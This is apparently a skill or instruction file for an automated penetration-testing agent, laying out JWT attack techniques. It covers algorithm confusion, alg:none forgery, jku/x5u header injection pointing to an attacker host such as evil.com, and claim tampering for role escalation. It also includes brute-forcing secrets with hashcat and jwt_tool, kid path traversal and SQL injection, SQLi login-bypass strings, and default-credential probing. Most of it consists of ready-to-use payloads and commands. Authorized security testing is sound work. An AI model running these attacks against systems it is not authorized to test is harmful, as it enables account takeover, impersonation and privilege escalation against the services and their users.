# JWT Attack Techniques

## Decode and Inspect

1. Split the token on `.` — header (alg, kid, jku), payload (claims), signature
2. Base64-decode each segment; look for: `alg`, `kid`, `jku`, `x5u`, `typ`, `iss`, `aud`, `exp`, `sub`
3. Check if `alg` matches what the server expects (e.g., server says RS256 in JWKS but token uses HS256)
4. Look for weak claims: missing `aud`, overly broad `iss`, no `exp`, or `nbf` far in the past

Use **httpRequest** to call a JWKS endpoint if discovered:

```
GET /.well-known/jwks.json
GET /oauth2/certs
GET /.well-known/openid-configuration  → extract "jwks_uri" value
```

Fetch the JWKS, extract the key matching the token's `kid`, and check if it's RSA (RS256) or symmetric (oct).

## Algorithm Confusion (RS256 → HS256)

When server uses RS256 but accepts HS256, sign with the public key as HMAC secret:

1. Fetch the public key from `jwks_uri` (the full PEM or the `n`/`e` values from the JWK)
2. Set the JWT header `alg` to `HS256`
3. Use the RSA public key (PEM string) as the HMAC signing secret
4. Server verifies the HMAC using the same public key — it matches because it uses the public key for both signature verification and HMAC verification
5. Sign with a tool: `jwt_tool.py -X k -S HS256 -k public.pem`

Indicators: server returns a valid response for an HS256-signed token using the RS256 public key.

## alg:none Attack

Strip signature entirely, set alg to none:

1. Decode the JWT, keep header and payload
2. Set `alg` to `none` in header
3. Remove the signature segment (keep the trailing dot): `header.payload.`
4. Send the token in the `Authorization: Bearer` header
5. If the server accepts it → critical vulnerability

If server rejects `none`, try mixed-case bypass:
- `None`, `NONE`, `nOnE`, `null`, `NaN`
- Some libraries only check lowercase `none` exactly

## Authentication Bypass (login bypass, default credentials, JWT alg:none)

For a dedicated login/auth endpoint, drive these authentication bypass techniques via the
`runPrimitive` primitive `authBypass` (id `authBypass`), which covers:
- **Login bypass** with SQLi credentials (`' OR '1'='1'-- `) against username/password fields.
- **Default credentials** — probe common admin pairs (admin:admin, root:root, test:test).
- **JWT alg:none** — forge an unsigned token from a captured sample and replay it.

A success signal (session cookie issued, or welcome/dashboard body) without valid credentials
confirms an authentication bypass. Pair with `writeFinding` once reproduced.

## jku / x5u Header Injection

If server validates JWT via JKU (JWK Set URL) or X5U:

1. Host your own JWKS at an attacker-controlled URL (e.g., `https://evil.com/jwks.json`)
2. Generate an RSA key pair for your malicious JWKS
3. Modify the JWT header: set `jku` to your URL
4. Sign the token with your private key
5. Server fetches your JWKS, finds the matching key, and validates your forged token
6. Same technique works for `x5u` (X.509 certificate URL)

Additional tricks:
- Try `jku: //evil.com/jwks.json` (protocol-relative bypass)
- Try `jku: https://evil.com%40real-server.com/jwks.json` (URL parsing confusion)
- If server uses `new URL(jku)`, test `jku: https://evil.com\@real-server.com/` (backslash confusion on some parsers)

## Token Manipulation Payloads

- **Role escalation**: Change `"role": "user"` → `"role": "admin"` in payload
- **User impersonation**: Change `"sub": "12345"` → `"sub": "admin"` or `"sub": "1"`
- **Audience bypass**: Change `"aud": "internal-api"` → `"aud": "public-api"` if server uses multiple validation paths
- **Expiry extension**: Change `"exp": 1700000000` → `"exp": 9999999999`
- **Issuer spoofing**: Change `"iss": "app"` → `"iss": "app-admin"` if issuer controls role assignment
- **Claims injection**: Add `"admin": true`, `"permissions": ["*"]`, `"email": "admin@target.com"`

## Weak Secret Brute Force

If `alg` is HS256/HS384/HS512, brute force the signing secret:

1. Try common secrets: `secret`, `password`, `key`, `jwt-secret`, `changeme`, app name
2. Try wordlist attack with `hashcat -m 16500 jwt.txt wordlist.txt`
3. Try `jwt_tool.py -X s -S HS256 -p common-passwords.txt`
4. If token is issued by the app (not external IdP), the secret may be in source code, config files, or environment variables

## Key Confusion Detection

If you see `kid` (Key ID) in JWT header:

1. The server uses `kid` to select the verification key from its JWKS
2. Test **path traversal**: set `kid` to `../../dev/null` — some servers read the key file by path and `/dev/null` is empty, causing HMAC verification with empty key
3. Test **SQL injection in kid**: `kid': ' OR '1'='1' --` if the server stores keys in a database
4. Test **known key override**: if the JWKS has multiple keys, pick a weaker one (e.g., RSA-256 instead of RSA-4096)

## JWT Tool Commands

```bash
# Decode JWT
jwt_tool.py <token>

# Tamper claims
jwt_tool.py <token> -T -S HS256 -p "your-secret"

# Test alg:none
jwt_tool.py <token> -X k -S none

# Brute force HS256
jwt_tool.py <token> -X s -S HS256 -p wordlist.txt

# Fetch JWKS and verify
jwt_tool.py <token> -j <jwks_uri>

# Forge token with custom claims
jwt_tool.py -I -pc role -pv admin -S HS256 -p "secret"

# Test JKU injection
jwt_tool.py <token> -X u -pk attacker-jwks.pem -S RS256
```
